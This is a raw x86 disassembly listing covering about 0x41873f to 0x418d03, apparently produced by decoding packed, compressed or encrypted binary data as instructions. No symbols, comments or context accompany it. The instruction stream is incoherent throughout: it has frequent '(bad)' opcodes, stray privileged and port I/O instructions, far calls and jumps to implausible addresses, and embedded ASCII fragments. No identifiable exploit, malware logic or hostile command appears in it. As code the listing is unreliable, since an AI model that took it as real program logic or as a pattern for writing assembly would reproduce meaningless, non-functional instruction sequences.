  41873f:	af                   	scas   %es:(%edi),%eax
  418740:	f2 c5 82 00 39 ee eb 	repnz lds -0x1411c700(%edx),%eax
  418747:	12 7e 48             	adc    0x48(%esi),%bh
  41874a:	48                   	dec    %eax
  41874b:	c2 b1 01             	ret    $0x1b1
  41874e:	ba 00 da 64 87       	mov    $0x8764da00,%edx
  418753:	bd 0d f8 b8 70       	mov    $0x70b8f80d,%ebp
  418758:	8d a5 15 c4 12 ba    	lea    -0x45ed3beb(%ebp),%esp
  41875e:	3d 98 fb a8 38       	cmp    $0x38a8fb98,%eax
  418763:	39 36                	cmp    %esi,(%esi)
  418765:	d4 f0                	aam    $0xf0
  418767:	f4                   	hlt
  418768:	ff 35 59 70 70 ed    	push   0xed707059
  41876e:	20 f6                	and    %dh,%dh
  418770:	38 35 5c 6c 09 43    	cmp    %dh,0x43096c5c
  418776:	76 f8                	jbe    0x418770
  418778:	3b 0c b0             	cmp    (%eax,%esi,4),%ecx
  41877b:	d6                   	salc
  41877c:	b1 b2                	mov    $0xb2,%cl
  41877e:	25 9c f2 d9 21       	and    $0x21d9f29c,%eax
  418783:	d6                   	salc
  418784:	39 ac 85 8c 2f 2e dd 	cmp    %ebp,-0x22d1d074(%ebp,%eax,4)
  41878b:	5c                   	pop    %esp
  41878c:	41                   	inc    %ecx
  41878d:	43                   	inc    %ebx
  41878e:	ab                   	stos   %eax,%es:(%edi)
  41878f:	07                   	pop    %es
  418790:	5c                   	pop    %esp
  418791:	43                   	inc    %ebx
  418792:	75 80                	jne    0x418714
  418794:	d6                   	salc
  418795:	56                   	push   %esi
  418796:	19 00                	sbb    %eax,(%eax)
  418798:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  418799:	9e                   	sahf
  41879a:	3d 5c 52 3f b7       	cmp    $0xb73f525c,%eax
  41879f:	4e                   	dec    %esi
  4187a0:	76 2d                	jbe    0x4187cf
  4187a2:	2b c7                	sub    %edi,%eax
  4187a4:	07                   	pop    %es
  4187a5:	44                   	inc    %esp
  4187a6:	f5                   	cmc
  4187a7:	48                   	dec    %eax
  4187a8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4187a9:	e5 c8                	in     $0xc8,%eax
  4187ab:	e6 07                	out    %al,$0x7
  4187ad:	05 44 4c f6 b9       	add    $0xb9f64c44,%eax
  4187b2:	d4 3c                	aam    $0x3c
  4187b4:	04 70                	add    $0x70,%al
  4187b6:	1b f8                	sbb    %eax,%edi
  4187b8:	54                   	push   %esp
  4187b9:	0a d4                	or     %ah,%dl
  4187bb:	2a a8 90 1f 42 3e    	sub    0x3e421f90(%eax),%ch
  4187c1:	29 a6 dd 33 c9 ba    	sub    %esp,-0x4536cc23(%esi)
  4187c7:	bc dd d6 40 f8       	mov    $0xf840d6dd,%esp
  4187cc:	9b                   	fwait
  4187cd:	8d 49 ba             	lea    -0x46(%ecx),%ecx
  4187d0:	e4 dd                	in     $0xdd,%al
  4187d2:	2b c1                	sub    %ecx,%eax
  4187d4:	d2 29                	shrb   %cl,(%ecx)
  4187d6:	22 bd 14 ee 48 f8    	and    -0x7b711ec(%ebp),%bh
  4187dc:	32 48 c3             	xor    -0x3d(%eax),%cl
  4187df:	78 f8                	js     0x4187d9
  4187e1:	dd 57 ea             	fstl   -0x16(%edi)
  4187e4:	28 16                	sub    %dl,(%esi)
  4187e6:	05 27 1b 0a 40       	add    $0x400a1b27,%eax
  4187eb:	c7                   	(bad)
  4187ec:	3b db                	cmp    %ebx,%ebx
  4187ee:	ad                   	lods   %ds:(%esi),%eax
  4187ef:	e9 da fe 07 05       	jmp    0x54986ce
  4187f4:	fa                   	cli
  4187f5:	ff 0b                	decl   (%ebx)
  4187f7:	0f b7 03             	movzwl (%ebx),%eax
  4187fa:	8d bb e4 64 b1 94    	lea    -0x6b4e9b1c(%ebx),%edi
  418800:	a3 30 29 a8 64       	mov    %eax,0x64a82930
  418805:	20 77 1c             	and    %dh,0x1c(%edi)
  418808:	fb                   	sti
  418809:	e4 8b                	in     $0x8b,%al
  41880b:	b8 10 de 61 28       	mov    $0x2861de10,%eax
  418810:	d4 aa                	aam    $0xaa
  418812:	0c 66                	or     $0x66,%al
  418814:	8b 0e                	mov    (%esi),%ecx
  418816:	ac                   	lods   %ds:(%esi),%al
  418817:	73 6c                	jae    0x418885
  418819:	18 66 af             	sbb    %ah,-0x51(%esi)
  41881c:	45                   	inc    %ebp
  41881d:	fa                   	cli
  41881e:	24 1c                	and    $0x1c,%al
  418820:	e4 c0                	in     $0xc0,%al
  418822:	7e 40                	jle    0x418864
  418824:	04 c6                	add    $0xc6,%al
  418826:	45                   	inc    %ebp
  418827:	f9                   	stc
  418828:	01 1c 2c             	add    %ebx,(%esp,%ebp,1)
  41882b:	70 8e                	jo     0x4187bb
  41882d:	fc                   	cld
  41882e:	06                   	push   %es
  41882f:	15 18 8d 84 ba       	adc    $0xba848d18,%eax
  418834:	40                   	inc    %eax
  418835:	0b c0                	or     %eax,%eax
  418837:	c9                   	leave
  418838:	4c                   	dec    %esp
  418839:	c4 7a 3e             	les    0x3e(%edx),%edi
  41883c:	e4 ce                	in     $0xce,%al
  41883e:	84 fa                	test   %bh,%dl
  418840:	80 0c d8 58          	orb    $0x58,(%eax,%ebx,8)
  418844:	ff 98 3e ce 80 7d    	lcall  *0x7d80ce3e(%eax)
  41884a:	f9                   	stc
  41884b:	34 75                	xor    $0x75,%al
  41884d:	86 2d 07 1e 62 47    	xchg   %ch,0x47621e07
  418853:	fc                   	cld
  418854:	3c 67                	cmp    $0x67,%al
  418856:	87 45 5a             	xchg   %eax,0x5a(%ebp)
  418859:	b2 f4                	mov    $0xf4,%dl
  41885b:	2a 76 58             	sub    0x58(%esi),%dh
  41885e:	65 13 f6             	gs adc %esi,%esi
  418861:	21 48 74             	and    %ecx,0x74(%eax)
  418864:	36 18 68 8f          	sbb    %ch,%ss:-0x71(%eax)
  418868:	40                   	inc    %eax
  418869:	47                   	inc    %edi
  41886a:	c2 ec 75             	ret    $0x75ec
  41886d:	1c 19                	sbb    $0x19,%al
  41886f:	0c 80                	or     $0x80,%al
  418871:	2c fc                	sub    $0xfc,%al
  418873:	90                   	nop
  418874:	4e                   	dec    %esi
  418875:	7b 3f                	jnp    0x4188b6
  418877:	f4                   	hlt
  418878:	75 a6                	jne    0x418820
  41887a:	8d 7d f5             	lea    -0xb(%ebp),%edi
  41887d:	84 f7                	test   %dh,%bh
  41887f:	c0 ae 74 fa 48 14 ac 	shrb   $0xac,0x1448fa74(%esi)
  418886:	0f 8d f7 6b 1c be    	jge    0xbe5df483
  41888c:	26 1c 68             	es sbb $0x68,%al
  41888f:	26 bd 0f 68 80 0a    	es mov $0xa80680f,%ebp
  418895:	f6 4b 72 01          	testb  $0x1,0x72(%ebx)
  418899:	b8 44 f5 0a 68       	mov    $0x680af544,%eax
  41889e:	8c 15 f6 26 63 33    	mov    %ss,0x336326f6
  4188a4:	48                   	dec    %eax
  4188a5:	ba 05 d6 95 0f       	mov    $0xf95d605,%edx
  4188aa:	76 a1                	jbe    0x41884d
  4188ac:	7f fb                	jg     0x4188a9
  4188ae:	46                   	inc    %esi
  4188af:	da 40 04             	fiaddl 0x4(%eax)
  4188b2:	55                   	push   %ebp
  4188b3:	fe                   	(bad)
  4188b4:	2b d0                	sub    %eax,%edx
  4188b6:	0f 8c a1 e0 c0 de    	jl     0xdf02695d
  4188bc:	02 c1                	add    %cl,%al
  4188be:	b2 a3                	mov    $0xa3,%dl
  4188c0:	8a ac 20 92 86 2f d9 	mov    -0x26d0796e(%eax,%eiz,1),%ch
  4188c7:	eb 6f                	jmp    0x418938
  4188c9:	1d fe 1c 40 5a       	sbb    $0x5a401cfe,%eax
  4188ce:	c2 ac 96             	ret    $0x96ac
  4188d1:	ad                   	lods   %ds:(%esi),%eax
  4188d2:	dd 69 92             	(bad) -0x6e(%ecx)
  4188d5:	a0 21 0f a0 8d       	mov    0x8da00f21,%al
  4188da:	2c 22                	sub    $0x22,%al
  4188dc:	4d                   	dec    %ebp
  4188dd:	9a c1 1a 2c 37 ce 20 	lcall  $0x20ce,$0x372c1ac1
  4188e4:	2d 21 06 ba c7       	sub    $0xc7ba0621,%eax
  4188e9:	32 5f 20             	xor    0x20(%edi),%bl
  4188ec:	04 eb                	add    $0xeb,%al
  4188ee:	27                   	daa
  4188ef:	0a 59 ab             	or     -0x55(%ecx),%bl
  4188f2:	56                   	push   %esi
  4188f3:	b3 46                	mov    $0x46,%bl
  4188f5:	01 f3                	add    %esi,%ebx
  4188f7:	3b a9 bb 52 cf 0e    	cmp    0xecf52bb(%ecx),%ebp
  4188fd:	47                   	inc    %edi
  4188fe:	ea 27 66 69 67 71 eb 	ljmp   $0xeb71,$0x67696627
  418905:	25 29 a2 69 97       	and    $0x9769a229,%eax
  41890a:	24 f3                	and    $0xf3,%al
  41890c:	a3 47 e8 00 0b       	mov    %eax,0xb00e847
  418911:	ab                   	stos   %eax,%es:(%edi)
  418912:	78 55                	js     0x418969
  418914:	70 bc                	jo     0x4188d2
  418916:	41                   	inc    %ecx
  418917:	17                   	pop    %ss
  418918:	32 f6                	xor    %dh,%dh
  41891a:	73 3d                	jae    0x418959
  41891c:	13 0c 33             	adc    (%ebx,%esi,1),%ecx
  41891f:	0b 5c 0d 48          	or     0x48(%ebp,%ecx,1),%ebx
  418923:	93                   	xchg   %eax,%ebx
  418924:	57                   	push   %edi
  418925:	a3 d3 2d ba 6a       	mov    %eax,0x6aba2dd3
  41892a:	06                   	push   %es
  41892b:	0f 53 5f 63          	rcpps  0x63(%edi),%xmm3
  41892f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  418930:	d8 64 71 56          	fsubs  0x56(%ecx,%esi,2)
  418934:	d8 5d 4b             	fcomps 0x4b(%ebp)
  418937:	3d 23 09 a8 d0       	cmp    $0xd0a80923,%eax
  41893c:	0b 6f 94             	or     -0x6c(%edi),%ebp
  41893f:	78 59                	js     0x41899a
  418941:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  418942:	a8 56                	test   $0x56,%al
  418944:	77 b4                	ja     0x4188fa
  418946:	5b                   	pop    %ebx
  418947:	38 0c ea             	cmp    %cl,(%edx,%ebp,8)
  41894a:	e4 f4                	in     $0xf4,%al
  41894c:	fe                   	(bad)
  41894d:	f8                   	clc
  41894e:	69 89 64 92 5f b1 c9 	imul   $0xdfbb45c9,-0x4ea06d9c(%ecx),%ecx
  418955:	45 bb df 
  418958:	01 27                	add    %esp,(%edi)
  41895a:	20 21                	and    %ah,(%ecx)
  41895c:	8f                   	(bad)
  41895d:	d0 df                	rcr    $1,%bh
  41895f:	10 81 1c 8c 08 c1    	adc    %al,-0x3ef773e4(%ecx)
  418965:	b2 00                	mov    $0x0,%dl
  418967:	ff                   	ljmp   (bad)
  418968:	e8 ac 52 bc 09       	call   0x9fddc19
  41896d:	9a 46 df 7a ad 09 41 	lcall  $0x4109,$0xad7adf46
  418974:	14 d4                	adc    $0xd4,%al
  418976:	80 6e f0 0d          	subb   $0xd,-0x10(%esi)
  41897a:	08 cc                	or     %cl,%ah
  41897c:	52                   	push   %edx
  41897d:	ad                   	lods   %ds:(%esi),%eax
  41897e:	bd 15 00 78 49       	mov    $0x49780015,%ebp
  418983:	7e bc                	jle    0x418941
  418985:	ee                   	out    %al,(%dx)
  418986:	68 04 e0 e1 f4       	push   $0xf4e1e004
  41898b:	fe 0a                	decb   (%edx)
  41898d:	80 c0 8b             	add    $0x8b,%al
  418990:	35 f9 15 b4 b8       	xor    $0xb8b415f9,%eax
  418995:	99                   	cltd
  418996:	eb ae                	jmp    0x418946
  418998:	ec                   	in     (%dx),%al
  418999:	8d                   	lea    (bad),%edi
  41899a:	f8                   	clc
  41899b:	49                   	dec    %ecx
  41899c:	0c ab                	or     $0xab,%al
  41899e:	24 2c                	and    $0x2c,%al
  4189a0:	10 0c 3b             	adc    %cl,(%ebx,%edi,1)
  4189a3:	80 31 b0             	xorb   $0xb0,(%ecx)
  4189a6:	35 c2 df 63 40       	xor    $0x4063dfc2,%eax
  4189ab:	e2 4c                	loop   0x4189f9
  4189ad:	09 cf                	or     %ecx,%edi
  4189af:	e8 9f 4d 71 24       	call   0x24b2d753
  4189b4:	ac                   	lods   %ds:(%esi),%al
  4189b5:	e7 07                	out    %eax,$0x7
  4189b7:	a3 31 1f 9b 40       	mov    %eax,0x409b1f31
  4189bc:	f8                   	clc
  4189bd:	32 33                	xor    (%ebx),%dh
  4189bf:	34 35                	xor    $0x35,%al
  4189c1:	3a f7                	cmp    %bh,%dh
  4189c3:	0e                   	push   %cs
  4189c4:	2b 73 61             	sub    0x61(%ebx),%esi
  4189c7:	62 6c 0b 57          	bound  %ebp,0x57(%ebx,%ecx,1)
  4189cb:	54                   	push   %esp
  4189cc:	82 65 36 77          	andb   $0x77,0x36(%ebp)
  4189d0:	a3 8b 07 f2 02       	mov    %eax,0x2f2078b
  4189d5:	88 e0                	mov    %ah,%al
  4189d7:	34 01                	xor    $0x1,%al
  4189d9:	45                   	inc    %ebp
  4189da:	9c                   	pushf
  4189db:	b0 58                	mov    $0x58,%al
  4189dd:	81 59 19 b7 94 27 e4 	sbbl   $0xe42794b7,0x19(%ecx)
  4189e4:	1b 59 5a             	sbb    0x5a(%ecx),%ebx
  4189e7:	b7 10                	mov    $0x10,%bh
  4189e9:	48                   	dec    %eax
  4189ea:	50                   	push   %eax
  4189eb:	c7                   	(bad)
  4189ec:	62 61 f1             	bound  %esp,-0xf(%ecx)
  4189ef:	37                   	aaa
  4189f0:	31 30                	xor    %esi,(%eax)
  4189f2:	43                   	inc    %ebx
  4189f3:	4b                   	dec    %ebx
  4189f4:	4c                   	dec    %esp
  4189f5:	95                   	xchg   %eax,%ebp
  4189f6:	e1 1e                	loope  0x418a16
  4189f8:	59                   	pop    %ecx
  4189f9:	a0 21 3d 94 b6       	mov    0xb6943d21,%al
  4189fe:	90                   	nop
  4189ff:	a3 dc 0a dc c1       	mov    %eax,0xc1dc0adc
  418a04:	50                   	push   %eax
  418a05:	d0 30                	shlb   $1,(%eax)
  418a07:	72 1d                	jb     0x418a26
  418a09:	c7                   	(bad)
  418a0a:	ec                   	in     (%dx),%al
  418a0b:	be dd 6e cc 7b       	mov    $0x7bcc6edd,%esi
  418a10:	0a 0e                	or     (%esi),%cl
  418a12:	ce                   	into
  418a13:	98                   	cwtl
  418a14:	04 c9                	add    $0xc9,%al
  418a16:	3c 18                	cmp    $0x18,%al
  418a18:	8c d8                	mov    %ds,%eax
  418a1a:	ef                   	out    %eax,(%dx)
  418a1b:	b0 49                	mov    $0x49,%al
  418a1d:	05 13 ca 04 c8       	add    $0xc804ca13,%eax
  418a22:	4c                   	dec    %esp
  418a23:	14 b3                	adc    $0xb3,%al
  418a25:	48                   	dec    %eax
  418a26:	b2 c5                	mov    $0xc5,%dl
  418a28:	5e                   	pop    %esi
  418a29:	39 f4                	cmp    %esi,%esp
  418a2b:	4c                   	dec    %esp
  418a2c:	0c d0                	or     $0xd0,%al
  418a2e:	0b 47 06             	or     0x6(%edi),%eax
  418a31:	a1 97 0c b2 44       	mov    0x44b20c97,%eax
  418a36:	8b 27                	mov    (%edi),%esp
  418a38:	9a e8 e8 0e e4 8b 83 	lcall  $0x838b,$0xe40ee8e8
  418a3f:	a8 e1                	test   $0xe1,%al
  418a41:	85 ec                	test   %ebp,%esp
  418a43:	ec                   	in     (%dx),%al
  418a44:	df 13                	fists  (%ebx)
  418a46:	a0 c9 38 f0 d0       	mov    0xd0f038c9,%al
  418a4b:	f0 58                	lock pop %eax
  418a4d:	35 74 49 3e f1       	xor    $0xf13e4974,%eax
  418a52:	61                   	popa
  418a53:	f8                   	clc
  418a54:	1b 0c 6a             	sbb    (%edx,%ebp,2),%ecx
  418a57:	a9 4c 68 24 06       	test   $0x624684c,%eax
  418a5c:	c8 cf 9c e1          	enter  $0x9ccf,$0xe1
  418a60:	e8 ba 05 6f e8       	call   0xe8b0901f
  418a65:	24 0f                	and    $0xf,%al
  418a67:	01 0b                	add    %ecx,(%ebx)
  418a69:	f8                   	clc
  418a6a:	b8 c8 b7 b0 08       	mov    $0x8b0b7c8,%eax
  418a6f:	1a 37                	sbb    (%edi),%dh
  418a71:	32 7f 9e             	xor    -0x62(%edi),%bh
  418a74:	68 72 2c 82 4d       	push   $0x4d822c72
  418a79:	54                   	push   %esp
  418a7a:	06                   	push   %es
  418a7b:	09 16                	or     %edx,(%esi)
  418a7d:	f2 10 4b ff          	repnz adc %cl,-0x1(%ebx)
  418a81:	e1 7b                	loope  0x418afe
  418a83:	2c 9b                	sub    $0x9b,%al
  418a85:	ed                   	in     (%dx),%eax
  418a86:	b6 0c                	mov    $0xc,%dh
  418a88:	e2 07                	loop   0x418a91
  418a8a:	ec                   	in     (%dx),%al
  418a8b:	5b                   	pop    %ebx
  418a8c:	03 bc 88 59 20 36 cb 	add    -0x34c9dfa7(%eax,%ecx,4),%edi
  418a93:	66 d9 84 5d 54 44 60 	data16 flds 0x14604454(%ebp,%ebx,2)
  418a9a:	14 
  418a9b:	c8 99 34 cd          	enter  $0x3499,$0xcd
  418a9f:	72 eb                	jb     0x418a8c
  418aa1:	1b 98 03 78 9a 48    	sbb    0x489a7803(%eax),%ebx
  418aa7:	b0 80                	mov    $0x80,%al
  418aa9:	6d                   	insl   (%dx),%es:(%edi)
  418aaa:	9a 66 d9 60 9b 30 e4 	lcall  $0xe430,$0x9b60d966
  418ab1:	94                   	xchg   %eax,%esp
  418ab2:	58                   	pop    %eax
  418ab3:	c4 2e                	les    (%esi),%ebp
  418ab5:	3b 73 b9             	cmp    -0x47(%ebx),%esi
  418ab8:	13 a0 c3 2c c5 0b    	adc    0xbc52cc3(%eax),%esp
  418abe:	b8 cc 70 cc b3       	mov    $0xb3cc70cc,%eax
  418ac3:	72 b3                	jb     0x418a78
  418ac5:	22 83 7c fb c8 af    	and    -0x50370484(%ebx),%al
  418acb:	83 dc b8             	sbb    $0xffffffb8,%esp
  418ace:	04 72                	add    $0x72,%al
  418ad0:	35 84 d0 a5 e2       	xor    $0xe2a5d084,%eax
  418ad5:	2d 39 c9 6e ac       	sub    $0xac6ec939,%eax
  418ada:	d0 98 ac e2 04 11    	rcrb   $1,0x1104e2ac(%eax)
  418ae0:	99                   	cltd
  418ae1:	db 19                	fistpl (%ecx)
  418ae3:	22 c0                	and    %al,%al
  418ae5:	af                   	scas   %es:(%edi),%eax
  418ae6:	00 92 99 a2 1f 32    	add    %dl,0x321fa299(%edx)
  418aec:	13 8b c0 e3 03 b9    	adc    -0x46fc1c40(%ebx),%ecx
  418af2:	2d c0 c1 00 d8       	sub    $0xd800c1c0,%eax
  418af7:	1f                   	pop    %ds
  418af8:	d7                   	xlat   %ds:(%ebx)
  418af9:	21 03                	and    %eax,(%ebx)
  418afb:	d4 24                	aam    $0x24
  418afd:	21 e2                	and    %esp,%edx
  418aff:	2f                   	das
  418b00:	50                   	push   %eax
  418b01:	f8                   	clc
  418b02:	74 69                	je     0x418b6d
  418b04:	6d                   	insl   (%dx),%es:(%edi)
  418b05:	65 20 65 77          	and    %ah,%gs:0x77(%ebp)
  418b09:	b7 0d                	mov    $0xd,%bh
  418b0b:	f2 af                	repnz scas %es:(%edi),%eax
  418b0d:	20 00                	and    %al,(%eax)
  418b0f:	61                   	popa
  418b10:	74 20                	je     0x418b32
  418b12:	30 00                	xor    %al,(%eax)
  418b14:	3f                   	aas
  418b15:	45                   	inc    %ebp
  418b16:	17                   	pop    %ss
  418b17:	fd                   	std
  418b18:	3f                   	aas
  418b19:	16                   	push   %ss
  418b1a:	b8 07 47 36 37       	mov    $0x37364707,%eax
  418b1f:	38 39                	cmp    %bh,(%ecx)
  418b21:	41                   	inc    %ecx
  418b22:	42                   	inc    %edx
  418b23:	43                   	inc    %ebx
  418b24:	44                   	inc    %esp
  418b25:	45                   	inc    %ebp
  418b26:	46                   	inc    %esi
  418b27:	20 05 e6 0e 95 00    	and    %al,0x950ee6
  418b2d:	0d 0a 9b 00 32       	or     $0x32009b0a,%eax
  418b32:	19 04 0c             	sbb    %eax,(%esp,%ecx,1)
  418b35:	4c                   	dec    %esp
  418b36:	6f                   	outsl  %ds:(%esi),(%dx)
  418b37:	80 48 02 e2          	orb    $0xe2,0x2(%eax)
  418b3b:	bd 0c 63 42 a6       	mov    $0xa642630c,%ebp
  418b40:	e9 1a f0 4c 5e       	jmp    0x5e8e7b5f
  418b45:	fb                   	sti
  418b46:	03 e4                	add    %esp,%esp
  418b48:	ec                   	in     (%dx),%al
  418b49:	4d                   	dec    %ebp
  418b4a:	b3 6c                	mov    $0x6c,%bl
  418b4c:	9a f4 fc 04 5f 0c 14 	lcall  $0x140c,$0x5f04fcf4
  418b53:	1c 34                	sbb    $0x34,%al
  418b55:	4d                   	dec    %ebp
  418b56:	d3 34 24             	shll   %cl,(%esp)
  418b59:	2c 34                	sub    $0x34,%al
  418b5b:	3c 44                	cmp    $0x44,%al
  418b5d:	d3 34 4d d3 4c 54 5c 	shll   %cl,0x5c544cd3(,%ecx,2)
  418b64:	64 6c                	fs insb (%dx),%es:(%edi)
  418b66:	4d                   	dec    %ebp
  418b67:	d3 34 4d 74 7c 84 8c 	shll   %cl,-0x737b838c(,%ecx,2)
  418b6e:	94                   	xchg   %eax,%esp
  418b6f:	9c                   	pushf
  418b70:	34 4d                	xor    $0x4d,%al
  418b72:	d3 34 a4             	shll   %cl,(%esp,%eiz,4)
  418b75:	ac                   	lods   %ds:(%esi),%al
  418b76:	b4 bc                	mov    $0xbc,%ah
  418b78:	c4 69 ba             	les    -0x46(%ecx),%ebp
  418b7b:	4d                   	dec    %ebp
  418b7c:	d3 cc                	ror    %cl,%esp
  418b7e:	d4 dc                	aam    $0xdc
  418b80:	5f                   	pop    %edi
  418b81:	7f 5f                	jg     0x418be2
  418b83:	5f                   	pop    %edi
  418b84:	3d 67 9a a6 5f       	cmp    $0x5fa69a67,%eax
  418b89:	5f                   	pop    %edi
  418b8a:	60                   	pusha
  418b8b:	03 a7 20 83 7c ef    	add    -0x10837ce0(%edi),%esp
  418b91:	00 ab 07 04 05 9c    	add    %ch,-0x63fafbf9(%ebx)
  418b97:	9c                   	pushf
  418b98:	01 c1                	add    %eax,%ecx
  418b9a:	64 fb                	fs sti
  418b9c:	65 6a 41             	gs push $0x41
  418b9f:	06                   	push   %es
  418ba0:	f9                   	stc
  418ba1:	96                   	xchg   %eax,%esi
  418ba2:	07                   	pop    %es
  418ba3:	78 d0                	js     0x418b75
  418ba5:	39 39                	cmp    %edi,(%ecx)
  418ba7:	c8 c9 84 64          	enter  $0x84c9,$0x64
  418bab:	dc 34 65 8c e4 20 27 	fdivl  0x2720e48c(,%eiz,2)
  418bb2:	07                   	pop    %es
  418bb3:	40                   	inc    %eax
  418bb4:	66 f8                	data16 clc
  418bb6:	58                   	pop    %eax
  418bb7:	67 84 3c             	test   %bh,(%si)
  418bba:	79 f2                	jns    0x418bae
  418bbc:	0c 68                	or     $0x68,%al
  418bbe:	b0 67                	mov    $0x67,%al
  418bc0:	64 68 c9 93 83 5c    	fs push $0x5c8393c9
  418bc6:	c0 68 62 7c          	shrb   $0x7c,0x62(%eax)
  418bca:	69 82 01 8b 80 b3 70 	imul   $0xa6cb3670,-0x4c7f74ff(%edx),%eax
  418bd1:	36 cb a6 
  418bd4:	db 53 80             	fistl  -0x80(%ebx)
  418bd7:	03 90 d4 c4 e0 60    	add    0x60e0c4d4(%eax),%edx
  418bdd:	cc                   	int3
  418bde:	76 cd                	jbe    0x418bad
  418be0:	b6 59                	mov    $0x59,%dh
  418be2:	6c                   	insb   (%dx),%es:(%edi)
  418be3:	32 8d 07 c8 dc 03    	xor    0x3dcc807(%ebp),%cl
  418be9:	24 cd                	and    $0xcd,%al
  418beb:	73 9b                	jae    0x418b88
  418bed:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  418bee:	59                   	pop    %ecx
  418bef:	5c                   	pop    %esp
  418bf0:	94                   	xchg   %eax,%esp
  418bf1:	dc 2c ce             	fsubrl (%esi,%ecx,8)
  418bf4:	0f 03 b3 6c 9a a6 88 	lsl    -0x77596594(%ebx),%esi
  418bfb:	c0 e4 10             	shl    $0x10,%ah
  418bfe:	cf                   	iret
  418bff:	3c 6e                	cmp    $0x6e,%al
  418c01:	d3 34 4d 60 88 bc dc 	shll   %cl,-0x234377a0(,%ecx,2)
  418c08:	0c d0                	or     $0xd0,%al
  418c0a:	17                   	pop    %ss
  418c0b:	36 4d                	ss dec %ebp
  418c0d:	d3 74 03 68          	shll   %cl,0x68(%ebx,%eax,1)
  418c11:	94                   	xchg   %eax,%esp
  418c12:	cc                   	int3
  418c13:	f4                   	hlt
  418c14:	18 d1                	sbb    %dl,%cl
  418c16:	69 9a a6 59 40 6c 90 	imul   $0xd3e0b490,0x6c4059a6(%edx),%ebx
  418c1d:	b4 e0 d3 
  418c20:	34 cd                	xor    $0xcd,%al
  418c22:	b2 00                	mov    $0x0,%dl
  418c24:	d2 20                	shlb   %cl,(%eax)
  418c26:	3c 64                	cmp    $0x64,%al
  418c28:	8c 66 d9             	mov    %fs,-0x27(%esi)
  418c2b:	34 4d                	xor    $0x4d,%al
  418c2d:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  418c2e:	b8 d0 00 d3 34       	mov    $0x34d300d0,%eax
  418c33:	9b                   	fwait
  418c34:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  418c35:	69 9a 5c 88 a8 c4 fc 	imul   $0x36d428fc,-0x3b5777a4(%edx),%ebx
  418c3c:	28 d4 36 
  418c3f:	4d                   	dec    %ebp
  418c40:	d3 2c 54             	shrl   %cl,(%esp,%edx,2)
  418c43:	80 b4 e4 2c d5 33 76 	xorb   $0x27,0x7633d52c(%esp,%eiz,8)
  418c4a:	27 
  418c4b:	37                   	aaa
  418c4c:	63 58 d5             	arpl   %ebx,-0x2b(%eax)
  418c4f:	6c                   	insb   (%dx),%es:(%edi)
  418c50:	03 ac 5d 47 54 90 19 	add    0x19905447(%ebp,%ebx,2),%ebp
  418c57:	84 8c fb 1c f7 e1 ce 	test   %cl,-0x311e08e4(%ebx,%edi,8)
  418c5e:	d8 a4 9c 5e 03 04 0b 	fsubs  0xb04035e(%esp,%ebx,4)
  418c65:	1f                   	pop    %ds
  418c66:	d4 0f                	aam    $0xf
  418c68:	30 ce                	xor    %cl,%dh
  418c6a:	e8 be 1b 9b 5f       	call   0x5fdca82d
  418c6f:	5d                   	pop    %ebp
  418c70:	2f                   	das
  418c71:	c4 33                	les    (%ebx),%esi
  418c73:	67 34 bb             	addr16 xor $0xbb,%al
  418c76:	6e                   	outsb  %ds:(%esi),(%dx)
  418c77:	10 23                	adc    %ah,(%ebx)
  418c79:	94                   	xchg   %eax,%esp
  418c7a:	47                   	inc    %edi
  418c7b:	44                   	inc    %esp
  418c7c:	5e                   	pop    %esi
  418c7d:	5d                   	pop    %ebp
  418c7e:	ab                   	stos   %eax,%es:(%edi)
  418c7f:	cc                   	int3
  418c80:	9e                   	sahf
  418c81:	b1 f9                	mov    $0xf9,%cl
  418c83:	70 07                	jo     0x418c8c
  418c85:	db c4                	fcmovnb %st(4),%st
  418c87:	00 9b 97 14 02 87    	add    %bl,-0x78fdeb69(%ebx)
  418c8d:	eb ba                	jmp    0x418c49
  418c8f:	e7 27                	out    %eax,$0x27
  418c91:	6b 13 dc             	imul   $0xffffffdc,(%ebx),%edx
  418c94:	03 08                	add    (%eax),%ecx
  418c96:	37                   	aaa
  418c97:	bf 9d f9 78 dd       	mov    $0xdd78f99d,%edi
  418c9c:	00 07                	add    %al,(%edi)
  418c9e:	0c 73                	or     $0x73,%al
  418ca0:	e7 5e                	out    %eax,$0x5e
  418ca2:	03 10                	add    (%eax),%edx
  418ca4:	9e                   	sahf
  418ca5:	f4                   	hlt
  418ca6:	3d 0e 83 bb 6b       	cmp    $0x6bbb830e,%eax
  418cab:	5d                   	pop    %ebp
  418cac:	23 84 5e d8 35 db 33 	and    0x33db35d8(%esi,%ebx,2),%eax
  418cb3:	f7 f8                	idiv   %eax
  418cb5:	9a 03 f0 ac 0f b8 9a 	lcall  $0x9ab8,$0xfacf003
  418cbc:	75 cd                	jne    0x418c8b
  418cbe:	49                   	dec    %ecx
  418cbf:	cf                   	iret
  418cc0:	f7 64 5e 07          	mull   0x7(%esi,%ebx,2)
  418cc4:	7c d8                	jl     0x418c9e
  418cc6:	13 20                	adc    (%eax),%esp
  418cc8:	37                   	aaa
  418cc9:	18 83 d4 3f 5c 53    	sbb    %al,0x535c3fd4(%ebx)
  418ccf:	2c f3                	sub    $0xf3,%al
  418cd1:	e8 17 9d f4 a4       	call   0xa53629ed
  418cd6:	5d                   	pop    %ebp
  418cd7:	bc 4b fc 5d 2f       	mov    $0x2f5dfc4b,%esp
  418cdc:	0c 5e                	or     $0x5e,%al
  418cde:	03 04 d3             	add    (%ebx,%edx,8),%eax
  418ce1:	d4 9d                	aam    $0x9d
  418ce3:	ee                   	out    %al,(%dx)
  418ce4:	8b a3 a4 87 b4 87    	mov    -0x784b785c(%ebx),%esp
  418cea:	7c 06                	jl     0x418cf2
  418cec:	e9 74 a7 2f 7b       	jmp    0x7b713465
  418cf1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  418cf2:	3f                   	aas
  418cf3:	40                   	inc    %eax
  418cf4:	e9 ba ee f4 1f       	jmp    0x20367bb3
  418cf9:	57                   	push   %edi
  418cfa:	13 e0                	adc    %eax,%esp
  418cfc:	4f                   	dec    %edi
  418cfd:	cc                   	int3
  418cfe:	07                   	pop    %es
  418cff:	c0 4e 93 be          	rorb   $0xbe,-0x6d(%esi)
  418d03:	ae                   	scas   %es:(%edi),%al
